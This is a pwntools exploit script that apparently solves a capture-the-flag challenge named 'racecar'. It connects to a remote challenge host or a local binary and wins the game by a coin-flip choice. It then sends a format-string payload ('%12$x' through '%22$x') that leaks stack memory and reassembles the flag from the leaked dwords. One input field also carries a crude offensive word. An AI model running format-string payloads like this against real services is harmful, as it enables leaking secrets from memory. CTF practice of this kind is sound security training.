#!/usr/bin/env python3
from pwn import *
import random

def conn():
    if args.REMOTE:
        p = remote("188.166.146.25", 31832)
    else:
        p = process("given/racecar")
        if args.D:
            gdb.attach(p)
    return p

def win_the_game(p):
    """
    According to strace, we can see "openat(...,"flag.txt")" if we win the game
    There are two ways to win:
        1) select car No.1 with circuit race (race 2)
        2) select car No.2 with highway battle (race 1)
    """
    #
    p.recvuntil(b"Name:")
    p.sendline(b"pingjui")
    p.recvuntil(b"Nickname:")
    p.sendline(b"rape")

    # menu
    start_racing = b"2"
    p.recvuntil(b">")
    p.sendline(start_racing)

    # game started!
    coin_flip = random.randint(0, 1)
    selected_car = b"1" if coin_flip == 0 else b"2"
    selected_race = b"2" if coin_flip == 0 else b"1"

    p.recvuntil(b"Select car:")
    p.recvuntil(b">")
    p.sendline(selected_car)

    p.recvuntil(b"Select race:")
    p.recvuntil(b">")
    p.sendline(selected_race)

def exploit(p):
    """
    In function car_menu(),
    fgets() reads the flag.txt starting from -0x38(%ebp) with 0x
    then, winner is allowed to put input from -0x40(%ebp) with 0x170 bytes.
    therefore, if we send 8 bytes, we can see the flag
    see car_menu + 828
        car_menu + 849
    """
    p.recvuntil(b"Do you have anything to say to the press after your big victory?")
    p.sendline(b"%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x")
    p.recvuntil(b"whole world to know this:")
    p.recvline()
    flag_int = p.recvline()
    print(flag_int)

    dwords = flag_int[:-1].decode('ascii').split(" ")
    dwords = [dword.rjust(8, "0") for dword in dwords]
    print(dwords)

    subbytes = [bytes.fromhex(dword)[::-1] for dword in dwords]
    print(subbytes)

    flag = b"".join(subbytes)
    print(flag)

def main():
    p = conn()
    win_the_game(p)
    exploit(p)

if __name__ == "__main__":
    main()

